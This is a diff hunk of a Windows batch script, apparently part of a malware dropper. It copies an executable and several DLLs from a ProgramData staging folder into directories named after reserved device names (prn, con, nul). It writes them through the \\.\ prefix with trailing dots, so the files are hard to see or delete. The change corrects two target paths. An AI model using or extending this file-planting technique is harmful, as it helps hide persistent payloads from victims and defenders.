@@ -41,10 +41,10 @@ copy /Y "%ProgramData%\hared\Index.exe" "\\.\%ProgramData%\prndata..\prn.exe"
 type "%ProgramData%\hared\IconLib.dll" > "\\.\%ProgramData%\prndata..\prn"
 
 copy /Y "%ProgramData%\hared\Index.exe" "\\.\%ProgramData%\condata..\con.exe"
-type "%ProgramData%\hared\Kape.dll" > "\\.\%ProgramData%\prndata..\con"
+type "%ProgramData%\hared\Kape.dll" > "\\.\%ProgramData%\condata..\con"
 
 move /Y "%ProgramData%\hared\Index.exe" "\\.\%ProgramData%\nuldata..\nul.exe"
-type "%ProgramData%\hared\winfw.dll" > "\\.\%ProgramData%\prndata..\nul"
+type "%ProgramData%\hared\winfw.dll" > "\\.\%ProgramData%\nuldata..\nul"
 
 move /Y "%ProgramData%\hared\libssl-1_1.dll" "\\.\%ProgramData%\nuldata..\libssl-1_1.dll"
 move /Y "%ProgramData%\hared\vcruntime140.dll" "\\.\%ProgramData%\nuldata..\vcruntime140.dll"
